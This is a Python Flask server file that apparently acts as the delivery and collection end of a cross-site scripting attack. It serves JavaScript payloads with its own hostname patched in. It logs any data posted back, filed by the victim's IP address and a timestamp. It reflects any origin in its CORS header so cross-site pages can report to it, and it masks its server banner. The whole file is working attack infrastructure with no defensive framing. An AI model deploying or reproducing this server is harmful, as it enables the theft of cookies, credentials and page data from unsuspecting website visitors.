from flask import Flask, request, make_response
from datetime import datetime
import sys, os, re

port = 443
log_dir='./logs'
scripts_location = './scripts'


if not os.path.exists(log_dir):
    os.makedirs(log_dir)

class myFlask(Flask):
    def process_response(self, response):
        response.headers['server'] = 'Generic'
        return(response)

app = myFlask(__name__, static_url_path='')

@app.route('/<name>', methods=['GET'])
def script(name):
    try:
        host = request.headers.get('host')
        if len(host) < 1:
            host = request.headers.get('Host')
        name = re.search('[a-zA-Z0-9.]+', name)
        name = name.group()
        script = open(scripts_location + '/' + name).read()
        if len(host) > 0:
            script = script.replace('myserverhere', host)
        resp = make_response(script)
        resp.headers['Content-Type'] = 'application/javascript; charset=utf-8'
        resp.headers['Cache-Control'] = 'no-cache'
        return resp
    except Exception: 
        return ':p'

@app.route('/', methods= ['POST'])
def infos():
    try:
        client_ip = request.remote_addr
        ip_rgx = '^[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}$'
        if client_ip == '127.0.0.1':
            client_ip = request.headers.get('X-Forwarded-For')
        client_ip = re.match(ip_rgx, client_ip).group()
        log = open(log_dir + '/' + client_ip + '__' + datetime.now().strftime('%d.%m.%Y__%H.%M.%S__%f') + '.log', 'wb')
        metadata = request.args.get('meta')
        if not metadata:
            metadata = ''
        log.write(bytes('* [' + datetime.now().strftime('%d/%m/%Y %H:%M:%S') + ' @ ' + client_ip + '] ' + metadata + '\n', 'utf-8'))
        log.write(request.get_data())
        log.close()
    except Exception:
        pass
    resp = make_response('1') 
    origin = request.headers.get('Origin')
    if len(origin) < 1:
        origin = request.headers.get('origin')
    if len(origin) > 0:
        resp.headers['Access-Control-Allow-Origin'] = origin
    return resp

@app.route('/')
def home():
    return ':p'

if len(sys.argv) > 1:
    port = sys.argv[1]
app.run(port=port, host='0.0.0.0', ssl_context=('cert.pem', 'key.pem'))

